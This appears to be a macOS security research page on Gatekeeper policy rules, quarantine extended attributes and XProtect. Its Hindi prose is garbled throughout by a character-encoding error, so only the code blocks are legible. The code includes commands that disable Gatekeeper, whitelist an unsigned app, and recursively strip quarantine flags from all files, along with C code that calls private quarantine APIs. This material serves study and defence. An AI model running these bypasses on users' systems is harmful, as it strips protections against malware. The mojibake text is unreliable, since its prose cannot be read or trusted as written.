рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓рд╛ рдбреЗрдЯрд╛рдмреЗрд╕ **`/var/db/SystemPolicy`** рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИред рдЖрдк рдЗрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд░реВрдЯ рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓рд╛ рдирд┐рдпрдо "**App Store**" рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реБрдЖ рдФрд░ рджреВрд╕рд░рд╛ "**Developer ID**" рдкрд░ рдФрд░ рдкрд┐рдЫрд▓реА рдЫрд╡рд┐ рдореЗрдВ рдпрд╣ **App Store рдФрд░ рдкрд╣рдЪрд╛рдиреЗ рдЧрдП рдбреЗрд╡рд▓рдкрд░реНрд╕ рд╕реЗ рдРрдкреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдХреНрд╖рдо рдерд╛**ред
рдпрджрд┐ рдЖрдк рдЙрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ App Store рдореЗрдВ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ "**Notarized Developer ID" рдирд┐рдпрдо рдЧрд╛рдпрдм рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ**ред

**type GKE** рдХреЗ рднреА рд╣рдЬрд╛рд░реЛрдВ рдирд┐рдпрдо рд╣реИрдВ:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
рдпреЗ рд╣реИрд╢реЗрдЬ **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** рдФрд░ **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** рд╕реЗ рдЖрддреЗ рд╣реИрдВред

рдпрд╛ рдЖрдк рдкрд┐рдЫрд▓реА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sudo spctl --list
```
рд╡рд┐рдХрд▓реНрдк **`--master-disable`** рдФрд░ **`--global-disable`** рдХрд╛ рдЙрдкрдпреЛрдЧ **`spctl`** рдореЗрдВ рдЗрди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдЕрдХреНрд╖рдо** рдХрд░ рджреЗрдЧрд╛:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рдкрд░, рдПрдХ рдирдпрд╛ рд╡рд┐рдХрд▓реНрдк рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

**рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреЛрдИ рдРрдк GateKeeper рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПрдЧреА рдпрд╛ рдирд╣реАрдВ** :
```bash
spctl --assess -v /Applications/App.app
```
GateKeeper рдореЗрдВ рдирдП рдирд┐рдпрдо рдЬреЛрдбрд╝рдХрд░ рдХреБрдЫ рдРрдкреНрд╕ рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдлрд╛рдЗрд▓реНрд╕

**рдбрд╛рдЙрдирд▓реЛрдбрд┐рдВрдЧ** рдХреЗ рджреМрд░рд╛рди рдХрд┐рд╕реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдлрд╛рдЗрд▓ рдХреЛ, macOS рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ **рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕** рдЬреИрд╕реЗ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд░реНрд╕ рдпрд╛ рдИрдореЗрд▓ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕, рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╛рдЗрд▓ рдкрд░ рдПрдХ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдлрд╛рдЗрд▓ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ **рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ**, рдЬрд┐рд╕реЗ рдЖрдорддреМрд░ рдкрд░ "**рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдлреНрд▓реИрдЧ**" рдХреЗ рдирд╛рдо рд╕реЗ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдлрд╛рдЗрд▓ рдХреЛ рдПрдХ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕реНрд░реЛрдд (рдЗрдВрдЯрд░рдиреЗрдЯ) рд╕реЗ рдЖрдиреЗ рд╡рд╛рд▓реА рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рдЬреЛрдЦрд┐рдо рд╡рд╛рд▓реА рдХреЗ рд░реВрдк рдореЗрдВ **рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдпрд╣ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдирд╣реАрдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдо BitTorrent рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдЖрдорддреМрд░ рдкрд░ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВред

**рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдлреНрд▓реИрдЧ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ macOS рдХреЗ Gatekeeper рд╕реБрд░рдХреНрд╖рд╛ рдлреАрдЪрд░ рдХреЛ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ**ред

рдЬрд┐рд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ **рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдлреНрд▓реИрдЧ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ** (рдЬреИрд╕реЗ рдХрд┐ рдХреБрдЫ BitTorrent рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рд╛рде), Gatekeeper рдХреЗ **рдЪреЗрдХреНрд╕ рдкреНрд░рджрд░реНрд╢рд┐рдд рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХрдо рд╕реБрд░рдХреНрд╖рд┐рдд рдпрд╛ рдЕрдЬреНрдЮрд╛рдд рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЦреЛрд▓рддреЗ рд╕рдордп рд╕рд╛рд╡рдзрд╛рдиреА рдмрд░рддрдиреА рдЪрд╛рд╣рд┐рдПред

{% hint style="info" %}
рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреА **рд╡реИрдзрддрд╛ рдХреА рдЬрд╛рдВрдЪ** рдПрдХ **рд╕рдВрд╕рд╛рдзрди-рдЧрд╣рди** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдб рдФрд░ рдЙрд╕рдХреЗ рд╕рднреА рдмрдВрдбрд▓ рдХрд┐рдП рдЧрдП рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдХреНрд░рд┐рдкреНрдЯреЛрдЧреНрд░рд╛рдлрд┐рдХ **рд╣реИрд╢реЗрдЬ** рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рд╡реИрдзрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдореЗрдВ Apple рдХреЗ рд╕рд░реНрд╡рд░реЛрдВ рдкрд░ рдПрдХ **рдСрдирд▓рд╛рдЗрди рдЬрд╛рдВрдЪ** рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдХреНрдпрд╛ рдЗрд╕реЗ рдЬрд╛рд░реА рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд░рджреНрдж рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрди рдХрд╛рд░рдгреЛрдВ рд╕реЗ, рдкреВрд░реНрдг рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдФрд░ рдиреЛрдЯрд░рд╛рдЗрдЬреЗрд╢рди рдЬрд╛рдВрдЪ рдХреЛ рд╣рд░ рдмрд╛рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЙрдиреНрдЪ рд╣реЛрдиреЗ рдкрд░ рдЪрд▓рд╛рдирд╛ **рдЕрд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рд╣реИ**ред

рдЗрд╕рд▓рд┐рдП, рдпреЗ рдЬрд╛рдВрдЪреЗрдВ **рдХреЗрд╡рд▓ рдЙрди рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рдЪрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рд╣реЛрддрд╛ рд╣реИред**
{% endhint %}

{% hint style="warning" %}
рдпрд╣ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ **рдлрд╛рдЗрд▓ рдмрдирд╛рдиреЗ/рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдХреА рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рдореЗрдВ рдпрд╣ рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рд╣рд░ рдлрд╛рдЗрд▓ рдХреЛ рдмрдирд╛рдиреЗ рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдФрд░ рдиреЙрди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдЗрд╕реЗ рд╕реНрд╡рдпрдВ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ **Info.plist** рдореЗрдВ [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) рдХреБрдВрдЬреА рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдмрдирд╛рдИ рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рдкрд░ `com.apple.quarantine` рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рд╕реЗрдЯ рдХрд░реЗрдЧрд╛,
{% endhint %}

рдЗрд╕рдХреА рд╕реНрдерд┐рддрд┐ рдХреА **рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдФрд░ рд╕рдХреНрд╖рдо/рдЕрдХреНрд╖рдо** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИ (рд░реВрдЯ рдЖрд╡рд╢реНрдпрдХ) рдХреЗ рд╕рд╛рде:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
рдЖрдк рдпрд╣ рднреА **рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ quarantine рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ** рдЗрд╕рдХреЗ рд╕рд╛рде:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
**рдорд╛рди** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ **рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд** **рдЧреБрдгреЛрдВ** рдХреА рдФрд░ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдХрд┐ рдХрд┐рд╕ рдРрдк рдиреЗ quarantine attr рд▓рд┐рдЦрд╛ рд╣реИ:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ "рдЙрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рдкрд░ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдлреНрд▓реИрдЧреНрд╕ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ" (рдореИрдВрдиреЗ рдмрдирд╛рдИ рдЧрдИ рдлрд╛рдЗрд▓ рдореЗрдВ USER\_APPROVED рдлреНрд▓реИрдЧ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рд▓реЗрдХрд┐рди рдпрд╣ рдЗрд╕реЗ рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд░реЗрдЧрд╛):

<details>

<summary>рд╕реЛрд░реНрд╕ рдХреЛрдб рд▓рд╛рдЧреВ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдлреНрд▓реИрдЧреНрд╕</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
<details>

рдФрд░ рдЙрд╕ рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ **рд╣рдЯрд╛рдПрдВ** рдЗрд╕рдХреЗ рд╕рд╛рде:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
рдореИрдХреЛрдЬрд╝ рдЧреЗрдЯрдХреАрдкрд░ рдХреЗ рд╕рд╛рде рд╕рднреА рдХреНрд╡рд╛рд░рдВрдЯреАрди рдХреА рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЦреЛрдЬреЗрдВ:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЬрд╛рдирдХрд╛рд░реА **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** рдореЗрдВ рд╕реНрдерд┐рдд рдПрдХ рдХреЗрдВрджреНрд░реАрдп рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рднреА рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИ рдЬрд┐рд╕реЗ LaunchServices рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред

#### **Quarantine.kext**

рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗрд╡рд▓ **рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХрд░реНрдиреЗрд▓ рдХреИрд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** рдЙрдкрд▓рдмреНрдз рд╣реИ; рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк **https://developer.apple.com/** рд╕реЗ **Kernel Debug Kit** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рд╕рд┐рдореНрдмреЛрд▓рд┐рдХреЗрдЯреЗрдб рд╕рдВрд╕реНрдХрд░рдг рд╣реЛрдЧрд╛ред

### XProtect

XProtect macOS рдореЗрдВ рдПрдХ рдирд┐рд░реНрдорд┐рдд **рдПрдВрдЯреА-рдореИрд▓рд╡реЗрдпрд░** рд╕реБрд╡рд┐рдзрд╛ рд╣реИред XProtect **рдХрд┐рд╕реА рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЬрдм рдкрд╣рд▓реА рдмрд╛рд░ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЕрдкрдиреЗ рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЗ рдЬреНрдЮрд╛рдд рдореИрд▓рд╡реЗрдпрд░ рдФрд░ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдВрдЪрддрд╛ рд╣реИред рдЬрдм рдЖрдк Safari, Mail, рдпрд╛ Messages рдЬреИрд╕реЗ рдХреБрдЫ рдПрдкреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдлрд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, XProtect рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдлрд╛рдЗрд▓ рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рдЕрдкрдиреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЬреНрдЮрд╛рдд рдореИрд▓рд╡реЗрдпрд░ рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ XProtect **рдлрд╛рдЗрд▓ рдХреЛ рдЪрд▓рдиреЗ рд╕реЗ рд░реЛрдХ рджреЗрдЧрд╛** рдФрд░ рдЖрдкрдХреЛ рдЦрддрд░реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рдЪреЗрдд рдХрд░реЗрдЧрд╛ред

XProtect рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ Apple рджреНрд╡рд╛рд░рд╛ рдирдП рдореИрд▓рд╡реЗрдпрд░ рдкрд░рд┐рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕рд╛рде **рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ рдЕрдкрдбреЗрдЯ** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдпреЗ рдЕрдкрдбреЗрдЯ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЖрдкрдХреЗ Mac рдкрд░ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ XProtect рд╣рдореЗрд╢рд╛ рдирд╡реАрдирддрдо рдЬреНрдЮрд╛рдд рдЦрддрд░реЛрдВ рдХреЗ рд╕рд╛рде рдЕрджреНрдпрддрди рд░рд╣реЗред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ **XProtect рдПрдХ рдкреВрд░реНрдг-рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓рд╛ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕рдорд╛рдзрд╛рди рдирд╣реАрдВ рд╣реИ**ред рдпрд╣ рдХреЗрд╡рд▓ рдЬреНрдЮрд╛рдд рдЦрддрд░реЛрдВ рдХреА рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕реВрдЪреА рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдХреА рддрд░рд╣ рдСрди-рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреИрдирд┐рдВрдЧ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

рдЖрдк рдирд╡реАрдирддрдо XProtect рдЕрдкрдбреЗрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect **/Library/Apple/System/Library/CoreServices/XProtect.bundle** рд╕реНрдерд┐рдд рд╣реИ рдФрд░ рдЗрд╕ рдмрдВрдбрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдк XProtect рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: рдЗрди cdhashes рдХреЗ рд╕рд╛рде рдХреЛрдб рдХреЛ рдкреБрд░рд╛рдиреЗ entitlements рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
